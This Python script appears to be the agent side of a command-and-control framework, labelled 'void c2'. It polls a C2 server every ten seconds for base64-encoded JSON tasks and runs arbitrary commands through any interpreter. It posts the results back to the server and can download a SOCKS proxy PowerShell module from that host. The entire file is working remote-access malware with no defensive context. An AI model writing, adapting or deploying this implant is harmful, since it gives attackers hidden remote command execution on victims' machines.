#!/usr/bin/env python3

from urllib.request import urlopen, Request
from base64 import b64encode, b64decode
from subprocess import Popen, PIPE
from time import sleep
from sys import stdout
from dataclasses import dataclass
from typing import TextIO, Any, Optional
from datetime import datetime
import dataclasses
import inspect
import json

# Config
RHOST = "c2"
RPORT = "8080"
URL = f"http://{RHOST}:{RPORT}/command"
COOLDOWN = 10 # seconds

# Helper    
def to_base64(buffer:str, encoding="utf-8", to_bytes=False):
    if isinstance(buffer, str): buffer = bytes(buffer, encoding=encoding)
    buffer = b64encode(buffer)
    if not to_bytes: buffer = str(buffer, encoding=encoding)
    return buffer

def from_base64(buffer:str, encoding="utf-8", to_bytes=False):
    if isinstance(buffer, str): buffer = bytes(buffer, encoding=encoding)
    buffer = b64decode(buffer)
    if not to_bytes: buffer = str(buffer, encoding=encoding)
    return buffer

def popen(command, interpreter):
    try:
        process = Popen([interpreter, "-c", command], stdout=PIPE, stderr=PIPE)
        out_b, err_b = process.communicate()
        out_s = out_b.decode("utf-8", errors="replace") if isinstance(out_b, (bytes, bytearray)) else str(out_b)
        err_s = err_b.decode("utf-8", errors="replace") if isinstance(err_b, (bytes, bytearray)) else str(err_b)
        return {"stdout": out_s, "stderr": err_s, "returncode": process.returncode}
    except Exception as e:
        return {"stdout": "", "stderr": str(e), "returncode": 1}

@dataclass
class Status:
    status:str = "---"
    stream:TextIO = stdout
    terminal_width=64

    def write(self, buffer:str, flush=False):
        self.stream.write(buffer)
        if flush: self.stream.flush()

    def clear(self, flush=False):
        self.write(f"\r{self.terminal_width*' '}\r", flush=flush)

    def set_status(self, status:str=None):
        if status: self.status = status
    
    def write_status(self, status:str=None, flush=True):
        self.set_status(status)
        self.clear()
        self.write(self.status, flush=flush)
    
    def write_line(self, buffer:str, flush=False):
        self.clear()
        self.write(f"{buffer}\n")
        self.write_status()

    def update(self): self.write_status(flush=True)

STATUS = Status()

@dataclass
class JsonObject:

    @classmethod
    def subclasses(cls) -> list:
        seen, stack = set(), list(cls.__subclasses__())
        while stack:
            c = stack.pop()
            if c in seen: continue
            seen.add(c)
            stack.extend(c.__subclasses__())
        return list(seen)

    @classmethod
    def get_class_by_name(cls, name:str):
        subclasses = cls.subclasses()
        obj_class = list(filter(lambda subclass: subclass.__name__ == name, subclasses))
        return obj_class[0]

    @classmethod
    def build(cls, class_name, **data):
        obj_class = cls.get_class_by_name(class_name)
        # Allow protocol evolution: ignore unexpected fields instead of failing init.
        if dataclasses.is_dataclass(obj_class):
            allowed = {f.name for f in dataclasses.fields(obj_class)}
        else:
            allowed = set(inspect.signature(obj_class).parameters.keys())
            allowed.discard("self")
        filtered = {k: v for k, v in data.items() if k in allowed}
        obj = obj_class(**filtered)
        return obj

    @classmethod
    def build_from_json(cls, json_data:str):
        data = json.loads(json_data)
        obj = cls.build(**data)
        return obj

    def dump(self):
        return json.dumps(self, indent=2, default=lambda o: o.__dict__)

    def action(self):
        STATUS.write_line(f"[*] {str(self.__dict__)}")
        pass

@dataclass
class Exec(JsonObject):
    job_id:Optional[str] = None
    interpreter:str = None
    command:str = None
    output:Any = None

    def action(self):
        super().action()
        self.output = popen(command=self.command, interpreter=self.interpreter)

@dataclass
class ReverseSocksProxy(JsonObject):
    job_id: Optional[str] = None
    port: int = 0
    output: Any = None

    _url = f"http://{RHOST}:{RPORT}/resources/Invoke-SocksProxy/Invoke-SocksProxy.psm1"
    _script = "Invoke-SocksProxy.psm1"

    def action(self):
        super().action()
        STATUS.write_line(f"Downloading proxy module to {self._script} (port={self.port})")
        try:
            data = urlopen(self._url).read().decode("utf-8", errors="replace")
            with open(self._script, "w", encoding="utf-8", errors="replace") as fh:
                fh.write(data)
            self.output = {"saved_as": self._script, "bytes": len(data), "port": self.port}
        except Exception as e:
            self.output = {"error": str(e), "port": self.port}

def check_data():
    try:
        response = urlopen(URL)
    except:
        STATUS.write_line("Server is down")
        return
    data = response.read().decode("utf-8")
    data = from_base64(data)
    if data == "": return
    json_object = JsonObject.build_from_json(data)
    json_object.action()
    result = json_object.dump()
    result_encoded = to_base64(result, to_bytes=True)
    request = Request(URL, data=result_encoded, method="POST")
    response = urlopen(request)
    STATUS.write_status(f"[*] Updated at {datetime.now()}", flush=True)

def main():
    STATUS.write_status(f"[void c2]")
    sleep(1)
    STATUS.write_status("Starting...")
    try:
        while True:
            check_data()
            sleep(COOLDOWN)
    except KeyboardInterrupt:
        pass
    

if __name__ == '__main__': main()
